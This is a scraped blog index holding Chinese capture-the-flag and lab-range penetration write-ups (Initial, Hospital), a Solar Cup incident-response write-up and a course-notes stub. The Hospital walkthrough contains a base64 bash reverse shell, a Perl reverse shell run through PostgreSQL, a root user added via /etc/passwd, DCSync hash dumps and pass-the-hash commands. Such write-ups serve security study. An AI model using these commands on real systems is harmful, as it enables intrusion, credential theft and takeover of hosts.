172.22.1.21 run ​ 成功拿到shell，开始横向 load kiwi kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv ​ 导出hash [DC] 'xiaorang.lab' will be the domain [DC] 'DC01.xiaorang.lab' will be the DC server [DC] Exporting domain 'xiaorang.lab' [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) 502 krbtgt fb812eea13a18b7fcdb8e6d67ddc205b 514 1106 Marcus e07510a4284b3c97c8e7dee970918c5c 512 1107 Charles f6a9881cd5ae709abb4ac9ab87f24617 512 500 Administrator 10cf89a850fb1cdbe6bb432b859164c8 512 1000 DC01$ d75bd2d4524fcaee3946250f675aebf7 532480 1108 XIAORANG-WIN7$ 8b7dea43bed4b560504e925f0f1b5efd 4096 1104 XIAORANG-OA01$ fd2dbb99c526e5969d540669a099d158 4096 hash传递，拿flag proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \"type Users\\Administrator\\flag\\flag03.txt\" ​ ","date":"2025-01-12","objectID":"/chunqiuyunjing-initial/:2:5","series":null,"tags":["penetration","wp"],"title":"春秋云境-Initial综合渗透","uri":"/chunqiuyunjing-initial/#dc域控渗透"},{"categories":["penetration","wp"],"content":"\rflag03e8f88d0d43d6} 最终的flag flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6} ","date":"2025-01-12","objectID":"/chunqiuyunjing-initial/:2:6","series":null,"tags":["penetration","wp"],"title":"春秋云境-Initial综合渗透","uri":"/chunqiuyunjing-initial/#flag03"},{"categories":["penetration","wp"],"content":"春秋云境-Hospital综合渗透通关wp 靶标介绍： 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 内网渗透 Nacos Shiro Fastjson Decrypt ","date":"2025-01-11","objectID":"/chunqiuyunjing-hospital/:0:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Hospital综合渗透","uri":"/chunqiuyunjing-hospital/#"},{"categories":["penetration","wp"],"content":"\r外网打点先fscan扫一发 E:\\Tools\\web\\fscan_v1.82\u003efscan64.exe -h 39.99.139.1 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.2 start infoscan (icmp) Target 39.99.139.1 is alive [*] Icmp alive hosts len is: 1 39.99.139.1:22 open 39.99.139.1:8080 open [*] alive ports len is: 2 start vulscan [*] WebTitle: http://39.99.139.1:8080 code:302 len:0 title:None 跳转url: http://39.99.139.1:8080/login;jsessionid=6CA21A189A48B38DD79ABAF0DA1A6502 [*] WebTitle: http://39.99.139.1:8080/login;jsessionid=6CA21A189A48B38DD79ABAF0DA1A6502 code:200 len:2005 title:医疗管理后台 [+] http://39.99.139.1:8080 poc-yaml-spring-actuator-heapdump-file 已完成 1/2 [-] ssh 39.99.139.1:22 root root#123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 1/2 [-] ssh 39.99.139.1:22 root 123456~a ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 1/2 [-] ssh 39.99.139.1:22 root a123123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 1/2 [-] ssh 39.99.139.1:22 admin root ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 1/2 [-] ssh 39.99.139.1:22 admin admin@111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 访问http://39.99.139.1:8080/，弱口令admin/admin123登录，但未发现可进一步利用的点 ​ 根据fscan的回显，发现Shiro特征，jsessionid同时有acatuator泄露 ","date":"2025-01-11","objectID":"/chunqiuyunjing-hospital/:1:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Hospital综合渗透","uri":"/chunqiuyunjing-hospital/#外网打点"},{"categories":["penetration","wp"],"content":"\rActuator 配置漏洞访问/actuator/heapdump可下载heapdump E:\\Penetration_tools\\Java\\JDumpSpider\u003ejava -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump \u003e 1.txt Loading heap dump heapdump from cache failed. java.io.IOException: HPROF time mismatch. Cached 1725335049001 from heap dump 1736171505575 at org.graalvm.visualvm.lib.jfluid.heap.HprofHeap.\u003cinit\u003e(HprofHeap.java:385) at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.loadHeap(HeapFactory.java:96) at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.createHeap(HeapFactory.java:79) at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.createHeap(HeapFactory.java:55) at org.graalvm.visualvm.lib.jfluid.heap.GraalvmHeapHolder.\u003cinit\u003e(GraalvmHeapHolder.java:18) at cn.wanghw.Main.call(Main.java:66) at cn.wanghw.Main.main(Main.java:29) ​ ","date":"2025-01-11","objectID":"/chunqiuyunjing-hospital/:1:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-Hospital综合渗透","uri":"/chunqiuyunjing-hospital/#actuator-配置漏洞"},{"categories":["penetration","wp"],"content":"\rshiro 反序列化 打入内存马使用shiro反序列化利用工具 ​ 直接注入内存马 ​ 冰蝎4.0连过去 ​ 并不是root权限，得提权 弹shell出去 bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDYuNzUuMzcvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}' # bash -i \u003e\u0026 /dev/tcp/xxx.xxx.xxx.xxx/6666 0\u003e\u00261 ​ 查找具有 SUID权限的文件 app@web01:~$ find / -perm -u=s -type f 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null /usr/bin/vim.basic /usr/bin/su /usr/bin/newgrp /usr/bin/staprun /usr/bin/at /usr/bin/passwd 发现vim.basic有SUID权限，可以利用它添加 root 用户 构造一个具有root权限的用户 [root@iZ2ze8k64rnm1tt06g6ni2Z ~]# openssl passwd -1 -salt test 1234 //生成密码 $1$test$So8QlDklBBy90T3QcEYWU/ test:$1$test$So8QlDklBBy90T3QcEYWU/:0:0:/root:/bin/bash ","date":"2025-01-11","objectID":"/chunqiuyunjing-hospital/:1:2","series":null,"tags":["penetration","wp"],"title":"春秋云境-Hospital综合渗透","uri":"/chunqiuyunjing-hospital/#shiro-反序列化-打入内存马"},{"categories":["penetration","wp"],"content":"\rflag01：Vim.basic 提权读取flag随后使用vim.basic写入/etc/passwd /usr/bin/vim.basic /etc/passwd 随后切换test用户 app@web01:~$ su test su test Password: 1234 whoami root cd root ls flag cat flag cat: flag: Is a directory ll bash: line 11: ll: command not found cd flag ls flag01.txt cat flag01.txt O)) O)) O)) O)) O)) O)) O) O)) O)) O)) O)) O)) O)))) O) O)) O)O) O) O)) O)) O)))))) O)) O)) O)) O)) O) O)) O)) O)) O)) O)) O)) O)) O))O)) O)) O))) O) O))O)) O)) O)) O)) O)) O)) O)) O)) O)) O))O)) O)) O)) O)) O)) O)) O)) O)) O)) O)) O)) O))O)) O)) O)) O)) O)))O))) O)) flag01: flag{3d1da0b2-f052-414e-a123-b7a4ed48552a} ","date":"2025-01-11","objectID":"/chunqiuyunjing-hospital/:1:3","series":null,"tags":["penetration","wp"],"title":"春秋云境-Hospital综合渗透","uri":"/chunqiuyunjing-hospital/#flag01vimbasic-提权读取flag"},{"categories":["penetration","wp"],"content":"\r内网渗透","date":"2025-01-11","objectID":"/chunqiuyunjing-hospital/:2:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-Hospital综合渗透","uri":"/chunqiuyunjing-hospital/#内网渗透"},{"categories":["penetration","wp"],"content":"\r代理搭建查看内网ip信息 ifconfig eth0: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 inet 172.30.12.5 netmask 255.255.0.0 broadcast 172.30.255.255 inet6 fe80::216:3eff:fe12:687e prefixlen 64 scopeid 0x20\u003clink\u003e ether 00:16:3e:12:68:7e txqueuelen 1000 (Ethernet) RX packets 138078 bytes 125128819 (125.1 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 74970 bytes 43875716 (43.8 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u003chost\u003e loop txqueuelen 1000 (Local Loopback) RX packets 2496 bytes 216963 (216.9 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2496 bytes 216963 (216.9 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 vps中python起一个server python3 -m http.server 然后靶机通过wget下载fscan app@web01:~$ wget http://39.106.75.37:8000/fscan --2025-01-06 23:25:42-- http://39.106.75.37:8000/fscan Connecting to 39.106.75.37:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 7100304 (6.8M) [application/octet-stream] Saving to: ‘fscan’ 随后 chmod 777 fscan 使用fscan对内网网段进行扫描 app@web01:~$ ./fscan -h 172.30.12.5/24 ./fscan -h 172.30.12.5/24 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan trying RunIcmp2 The current user permissions unable to send icmp packets start ping (icmp) Target 172.30.12.5 is alive (icmp) Target 172.30.12.6 is alive (icmp) Target 172.30.12.236 is alive [*] Icmp alive hosts len is: 3 172.30.12.6:445 open 172.30.12.6:139 open 172.30.12.6:135 open 172.30.12.236:8080 open 172.30.12.5:8080 open 172.30.12.236:22 open 172.30.12.5:22 open 172.30.12.236:8009 open 172.30.12.6:8848 open [*] alive ports len is: 9 start vulscan [*] WebTitle http://172.30.12.5:8080 code:302 len:0 title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=E98AA97DE9EC60F59EF5111AF75C2940 [*] NetInfo [*]172.30.12.6 [-\u003e]Server02 [-\u003e]172.30.12.6 [*] NetBios 172.30.12.6 WORKGROUP\\SERVER02 [*] WebTitle http://172.30.12.5:8080/login;jsessionid=E98AA97DE9EC60F59EF5111AF75C2940 code:200 len:2005 title:医疗管理后台 [*] WebTitle http://172.30.12.236:8080 code:200 len:3964 title:医院后台管理平台 [*] WebTitle http://172.30.12.6:8848 code:404 len:431 title:HTTP Status 404 – Not Found [+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file [+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos [+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass [+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file 有如下两个资产 http://172.30.12.6:8848 poc-yaml-alibaba-nacos poc-yaml-alibaba-nacos-v1-auth-bypass http://172.30.12.236:8080 code:200 len:3964 title:医院后台管理平台 上传frp进行socks5代理 vps frps.ini [common] bind_port = 7000 靶机 frpc.ini [common] tls_enable = true server_addr =vps的ip server_port = 7000 [socks5] type = tcp remote_port = 6000 plugin = socks5 随后本地攻击机proxifier配置代理 ​ 规则里面只让chrome走代理 ​ ","date":"2025-01-11","objectID":"/chunqiuyunjing-hospital/:2:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-Hospital综合渗透","uri":"/chunqiuyunjing-hospital/#代理搭建"},{"categories":["penetration","wp"],"content":"\rflag02：nacos-yaml反序列化漏洞成功访问nacos ​ 尝试默认密码nacos/nacos直接登录， 不需要利用漏洞添加账号了 ​ 在配置文件里发现了数据库的账号密码，单无法连接 使用nacos漏洞利用工具，不要忘记设置代理 ​ 使用yaml-payload-master在本地制作一个含有恶意yaml的jar包 https://github.com/artsploit/yaml-payload 将AwesomeScriptEngineFactory.java中弹计算器的代码改成添加管理员用户的 ​ 之后打成jar包 javac src/artsploit/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src/ . ​ 注意java的版本，最后我用了jdk1.8.0_191版本才打通 我们起vps的python http.server，将jar传到flag01靶机 然后在flag01靶机起python http.server ​ ​ 打通之后，通过本地rdp可以连过去（走proxifier代理） ​ ​ ","date":"2025-01-11","objectID":"/chunqiuyunjing-hospital/:2:2","series":null,"tags":["penetration","wp"],"title":"春秋云境-Hospital综合渗透","uri":"/chunqiuyunjing-hospital/#flag02nacos-yaml反序列化漏洞"},{"categories":["penetration","wp"],"content":"\rflag03：Fastjson反序列化漏洞bp开一个socks代理 ​ 使用bp自带浏览器抓个包看看，发现是json形式传输，猜测jastjson ​ 直接使用bp fastjson插件打fastjsonecho Release Frist release · amaz1ngday/fastjson-exp · GitHub ​ 也可以直接注入内存马 ​ 哥斯拉进行连接 ​ 对web03进行信息收集 / \u003eifconfig eth0: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 inet 172.30.12.236 netmask 255.255.0.0 broadcast 172.30.255.255 inet6 fe80::216:3eff:fe13:340 prefixlen 64 scopeid 0x20\u003clink\u003e ether 00:16:3e:13:03:40 txqueuelen 1000 (Ethernet) RX packets 99152 bytes 124660068 (124.6 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 28532 bytes 13180871 (13.1 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth1: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 inet 172.30.54.179 netmask 255.255.255.0 broadcast 172.30.54.255 inet6 fe80::216:3eff:fe13:139 prefixlen 64 scopeid 0x20\u003clink\u003e ether 00:16:3e:13:01:39 txqueuelen 1000 (Ethernet) RX packets 389 bytes 16338 (16.3 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 409 bytes 17874 (17.8 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u003chost\u003e loop txqueuelen 1000 (Local Loopback) RX packets 5174 bytes 435967 (435.9 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 5174 bytes 435967 (435.9 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 发现有双网卡 中间插一下Linux写公钥登录： 将公钥添加到服务器的某个账户上，然后在客户端利用私钥即可完成认证并登录。 服务器创建密钥： └─# ssh-keygen # 建立密钥对 Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): # 按 Enter回车即可 /root/.ssh/id_rsa already exists. Overwrite (y/n)? y Enter passphrase (empty for no passphrase): # 输入密钥锁码，或直接按 Enter 留空 Enter same passphrase again: # 再输入一遍密钥锁码 Your identification has been saved in /root/.ssh/id_rsa # 私钥 Your public key has been saved in /root/.ssh/id_rsa.pub # 公钥 The key fingerprint is: SHA256: The key's randomart image is: 参数 -t #指定密钥类型 -b #指定密钥长度 现在当前root目录中生成了一个 .ssh 的隐藏目录，内含两个密钥文件。其中，id_rsa 为私钥，id_rsa.pub 为公钥。 在服务器上安装公钥 将公钥写入/root/.ssh/authorized_keys 修改authorized_keys权限为600，.ssh权限为700 [root@kali ]$ cd .ssh [root@kali .ssh]$ cat id_rsa.pub \u003e\u003e authorized_keys #公钥的安装注意：单尖括号\u003e表示将文件内容全部替换掉；双尖括号是追加。 [root@kali .ssh]$ chmod 600 authorized_keys [root@kali .ssh]$ chmod 700 ~/.ssh 设置 SSH，打开密钥登录功能 编辑 /etc/ssh/sshd_config 文件，进行如下设置： RSAAuthentication yes PubkeyAuthentication yes PermitRootLogin yes #root 用户允许通过 SSH 登录（可选） 重启SSH服务 [root@host .ssh]$ service sshd restart 该重启不会导致断连 ‍ 将私钥下载至客户端便可以实现公钥登录 ","date":"2025-01-11","objectID":"/chunqiuyunjing-hospital/:2:3","series":null,"tags":["penetration","wp"],"title":"春秋云境-Hospital综合渗透","uri":"/chunqiuyunjing-hospital/#flag03fastjson反序列化漏洞"},{"categories":["penetration","wp"],"content":"\r双层frp代理1.将frps上传到web01(172.30.12.5) frps.ini [common] bind_port = 8000 2.将frpc上传到web03(wget)(172.30.12.236) frpc.ini [common] server_addr = 172.30.12.5 server_port = 8000 [socks5] type = tcp remote_port = 6000 plugin = socks5 随后配置本地proxifier，构造代理链如下 ​ 配置代理规则 ​ 上fscan扫描 start infoscan (icmp) Target 172.30.54.179 is alive (icmp) Target 172.30.54.12 is alive [*] Icmp alive hosts len is: 2 172.30.54.179:22 open 172.30.54.179:8009 open 172.30.54.179:8080 open 172.30.54.12:5432 open 172.30.54.12:3000 open 172.30.54.12:22 open [*] alive ports len is: 6 start vulscan [*] WebTitle http://172.30.54.179:8080 code:200 len:3964 title:医院后台管理平台 [*] WebTitle http://172.30.54.12:3000 code:302 len:29 title:None 跳转url: http://172.30.54.12:3000/login [*] WebTitle http://172.30.54.12:3000/login code:200 len:27909 title:Grafana 从fscan扫描到的信息发现有grafana 能利用漏洞就只有 SSRF 和任意文件读取 搜索对应版本号，发现存在任意文件读取漏洞CVE-2021-43798, https://github.com/A-D-Team/grafanaExp/releases ","date":"2025-01-11","objectID":"/chunqiuyunjing-hospital/:2:4","series":null,"tags":["penetration","wp"],"title":"春秋云境-Hospital综合渗透","uri":"/chunqiuyunjing-hospital/#双层frp代理"},{"categories":["penetration","wp"],"content":"\rGrafana任意文件读取漏洞 root@web03:/home# ./linux_amd64_grafanaExp exp -u http://172.30.54.12:3000/ 读到了 postgreSQL 的账号密码 root@web03:/tmp# ./grafanaExp_linux_amd64 exp -u http://172.30.54.12:3000 2024/07/04 12:20:59 Target vulnerable has plugin [alertlist] 2024/07/04 12:20:59 Got secret_key [SW2YcwTIb9zpOOhoPsMm] 2024/07/04 12:20:59 There is [0] records in db. 2024/07/04 12:20:59 type:[postgres] name:[PostgreSQL] url:[localhost:5432] user:[postgres] password[Postgres@123] database:[postgres] basic_auth_user:[] basic_auth_password:[] 2024/07/04 12:20:59 All Done, have nice day! 使用proxifier的全局代理，navicat连上数据库 ​ ","date":"2025-01-11","objectID":"/chunqiuyunjing-hospital/:2:5","series":null,"tags":["penetration","wp"],"title":"春秋云境-Hospital综合渗透","uri":"/chunqiuyunjing-hospital/#grafana任意文件读取漏洞"},{"categories":["penetration","wp"],"content":"\rflag04：Postgresql提权后读flag需要用psql提权，所以先改一下root密码 ALTER USER root WITH PASSWORD '123456'; 创建命令执行函数 CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; 使用perl弹shell到flag03靶机 select system('perl -e \\'use Socket;$i=\"172.30.54.179\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};\\''); ​ 拿到shell之后由于需要交互shell，所以利用python获取交互shell python3 -c 'import pty;pty.spawn(\"/bin/bash\")' sudo -l发现psql可以无密码执行sudo 参考https://gtfobins.github.io/gtfobins/psql/ Matching Defaults entries for postgres on web04: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User postgres may run the following commands on web04: (ALL) NOPASSWD: /usr/local/postgresql/bin/psql 随后登入postgresql​ sudo /usr/local/postgresql/bin/psql 密码就是我们已经改好的123456 随后 \\? !/bin/bash ​ ​ ‍ ","date":"2025-01-11","objectID":"/chunqiuyunjing-hospital/:2:6","series":null,"tags":["penetration","wp"],"title":"春秋云境-Hospital综合渗透","uri":"/chunqiuyunjing-hospital/#flag04postgresql提权后读flag"},{"categories":["wp","emergency"],"content":"2024 第一届Solar杯应急响应挑战赛数据库、内存取证、流量分析wp ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:0:0","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#"},{"categories":["wp","emergency"],"content":"\r数据库题目附件：mssql、mssql题-备份数据库 ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:1:0","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#数据库"},{"categories":["wp","emergency"],"content":"\r数据库-1 请找到攻击者创建隐藏账户的时间 flag格式 如 flag{2024/01/01 00:00:00} x-ways加载镜像，导出\\Windows\\System32\\config 使用passwarekit恢复密码 使用rockyou字典进行破解 将ovf导入VMware 事件查看器——\u003e安全 过滤事件ID： 4720 flag{2024/12/16 15:24:21} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:1:1","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#数据库-1"},{"categories":["wp","emergency"],"content":"\r数据库-2 请找到恶意文件的名称 flag格式 如 flag{*.*} 可疑进程XMRig miner 进一步查看 flag{xmrig.exe} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:1:2","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#数据库-2"},{"categories":["wp","emergency"],"content":"\r数据库-3 请找到恶意文件的外联地址 flag格式 如 flag{1.1.1.1} 查看xmrig.exe进程 C:\\Users\\Administrator\u003etasklist | findstr xmrig.exe xmrig.exe 3784 Services 0 11,032 K 查看进程网络连接信息 C:\\Users\\Administrator\u003enetstat -ano | findstr 3784 TCP 61.139.2.132:49995 203.107.45.167:3333 SYN_SENT 3784 flag{203.107.45.167} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:1:3","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#数据库-3"},{"categories":["wp","emergency"],"content":"\r数据库-4 请修复数据库 flag格式 如 flag{xxxxx} 参考 【成功案例】lockbit家族百万赎金不必付！技术手段修复被加密的数据库，附溯源分析报告 勒索病毒只加密了文件头部 使用FileLocatorPro进行搜索 flag{E4r5t5y6mhgur89g} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:1:4","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#数据库-4"},{"categories":["wp","emergency"],"content":"\r数据库-5 请提交powershell命令中恶意文件的MD5 flag格式 如 flag{xxxxx} 在应用程序和服务日志中找到powershell的操作日志 筛选出事件ID为4104 执行远程命令的事件 将base64编码的文件导出gz文件，并解压 得到js代码文件 将其中base64的string再次解码 flag{d72000ee7388d7d58960db277a91cc40} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:1:5","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#数据库-5"},{"categories":["wp","emergency"],"content":"\r内存取证","date":"2024-12-31","objectID":"/2024solarcup_emergency/:2:0","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#内存取证"},{"categories":["wp","emergency"],"content":"\r内存取证-1 题目文件：SERVER-2008-20241220-162057 请找到rdp连接的跳板地址 flag格式 flag{1.1.1.1} flag{192.168.60.220} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:2:1","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#内存取证-1"},{"categories":["wp","emergency"],"content":"\r内存取证-2 题目文件：SERVER-2008-20241220-162057 请找到攻击者下载黑客工具的IP地址 flag格式 flag{1.1.1.1} flag{155.94.204.67} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:2:2","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#内存取证-2"},{"categories":["wp","emergency"],"content":"\r内存取证-3 攻击者获取的“FusionManager节点操作系统帐户（业务帐户）”的密码是什么 filescan 随后文件转储 flag{GalaxManager_2012} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:2:3","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#内存取证-3"},{"categories":["wp","emergency"],"content":"\r内存取证-4 题目文件：SERVER-2008-20241220-162057 请找到攻击者创建的用户 flag格式 flag{xxxx} flag{ASP.NET} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:2:4","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#内存取证-4"},{"categories":["wp","emergency"],"content":"\r内存取证-5 题目文件：SERVER-2008-20241220-162057 请找到攻击者利用跳板rdp登录的时间 pslist 要转换一下时区，他的是UTC时区，北京时间是UTC+8 flag{2024/12/21 00:15:34 } ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:2:5","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#内存取证-5"},{"categories":["wp","emergency"],"content":"\r内存取证-6 题目文件：SERVER-2008-20241220-162057 请找到攻击者创建的用户的密码哈希值 flag格式 flag{XXXX} Vol3进行密码哈希转储 flag{5ffe97489cbec1e08d0c6339ec39416d} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:2:6","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#内存取证-6"},{"categories":["wp","emergency"],"content":"\r签到本题作为签到题,请给出邮服发件顺序。 flag格式为flag{domain1|…|domainN} Received: from mail.da4s8gag.com ([140.143.207.229]) by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD for ; Thu, 17 Oct 2024 11:24:01 +0800 X-QQ-mid: xmmxszc6-1t1729135441tm9qrjq3k X-QQ-XMRINFO: NgToQqU5s31XQ+vYT/V7+uk= Authentication-Results: mx.qq.com; spf=none smtp.mailfrom=; dkim=none; dmarc=none(permerror) header.from=solar.sec Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1]) by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264 for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST) Date: Thu, 17 Oct 2024 11:24:01 +0800 To: hellosolartest@qq.com From: 鍏嬪競缃戜俊 Subject:xxxxxxxxxx Message-Id: \u003c20241017112401.032146@mail.solar.sec\u003e X-Mailer: QQMail 2.x XXXXXXXXXX GPT给出的答复： 邮件的发送顺序可以通过分析邮件头中的 Received 字段来确定。Received 字段按照从下到上的顺序记录了邮件经过的服务器。以下是该邮件的发送顺序： 邮件发送服务器： 邮件最初从 mail.solar.sec（IP 地址为 127.0.0.1）发送。 通过 mail.da4s8gag.com（Postfix）服务器进行转发，时间戳为 Thu, 17 Oct 2024 11:24:01 +0800 (CST)。 邮件接收服务器： 邮件被传递到 newxmmxszc6-1.qq.com（NewMX）服务器，时间戳为 Thu, 17 Oct 2024 11:24:01 +0800。 最终由 mx.qq.com 服务器接收并完成验证。 ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:2:7","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#签到"},{"categories":["wp","emergency"],"content":"\r日志流量题目文件：tomcat-wireshark.zip/web ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:3:0","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#日志流量"},{"categories":["wp","emergency"],"content":"\r日志流量-1 新手运维小王的Geoserver遭到了攻击： 黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。 flag格式 flag{xxxx} base64解码字符串得到flag flag{A7b4_X9zK_2v8N_wL5q4} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:3:1","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#日志流量-1"},{"categories":["wp","emergency"],"content":"\r日志流量-2 新手运维小王的Geoserver遭到了攻击： 小王拿到了当时被入侵时的流量，其中一个IP有访问webshell的流量，已提取部分放在了两个pcapng中了。请帮他解密该流量。 flag格式 flag{xxxx} 哥斯拉流量，一把梭工具真好用…. flag{dD7g_jk90_jnVm_aPkcs} 手动分析： 根据题目1得到密钥为a2550eeab0724a69，加密方法为AES-ECB 追踪并解码哥斯拉webshell流量 flag{sA4hP_89dFh_x09tY_lL4SI4} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:3:2","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#日志流量-2"},{"categories":["wp","emergency"],"content":"\r日志流量-3 新手运维小王的Geoserver遭到了攻击： 小王拿到了当时被入侵时的流量，黑客疑似通过webshell上传了文件，请看看里面是什么。 flag格式 flag{xxxx} 导出为gz并解压，得到的数据文件修改后缀为pdf，得到： flag{dD7g_jk90_jnVm_aPkcs} ","date":"2024-12-31","objectID":"/2024solarcup_emergency/:3:3","series":null,"tags":["wp","emergency"],"title":"2024 第一届Solar杯应急响应挑战赛","uri":"/2024solarcup_emergency/#日志流量-3"},{"categories":["notes"],"content":"Unlock to view this content. Unlock to view this content.\r# 网络安全 题型安排 选择题20个，30分 简述题5个，30分 综合题3个，40分 # 课程重点 ## 网络安全概述 #### 网络安全定义（关键词） 